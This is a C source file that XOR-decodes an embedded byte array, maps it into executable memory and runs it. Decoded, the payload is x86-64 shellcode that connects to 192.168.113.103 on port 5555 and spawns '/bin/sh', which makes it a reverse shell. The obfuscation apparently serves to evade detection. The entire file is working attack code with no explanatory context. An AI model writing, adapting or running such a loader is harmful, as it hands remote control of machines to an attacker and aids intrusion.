#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
int main() {
  unsigned char bogus[] =
      "\x5d\x1e\x6f\xae\x5d\x35\x68\x5d\x36\x69\x38\x32\x7f\xa0\x7f\x8e"
      "\x35\x37\x22\x84\xf7\x9f\x46\x50\x66\x7f\xbe\xd1\x5d\x27\x6d\x5d\x1d"
      "\x6f\x38\x32\x5d\x34\x69\x7f\xc8\xf9\x5d\x16\x6f\x38\x32\x42\xc1\x5d"
      "\x0c\x6f\xae\x7f\x8c\x18\x55\x5e\x59\x18\x44\x5f\x37\x64\x7f\xbe\xd0"
      "\x65\x60\x7f\xbe\xd1\x38\x32";
  size_t len = sizeof(bogus);

  // Create a writable array to hold the XORed result
  unsigned char shell[len];

  unsigned char key = 0x37;

  // XOR each byte in bogus[] with the key and store it in shell[]
  for (size_t i = 0; i < len; i++) {
    shell[i] = bogus[i] ^ key;
  }

  // Cast the shell array to a function pointer and execute the shellcode
  size_t size = sizeof(shell);

  // Allocate memory with RWX permissions
  void *exec_mem = mmap(NULL, size, PROT_READ | PROT_WRITE | PROT_EXEC,
                        MAP_ANON | MAP_PRIVATE, -1, 0);
  if (exec_mem == MAP_FAILED) {
    perror("mmap");
    exit(1);
  }

  // Copy shellcode into exec_mem
  memcpy(exec_mem, shell, size);

  // Execute it
  ((void (*)())exec_mem)(); // Call the shellcode

  return 0;
}
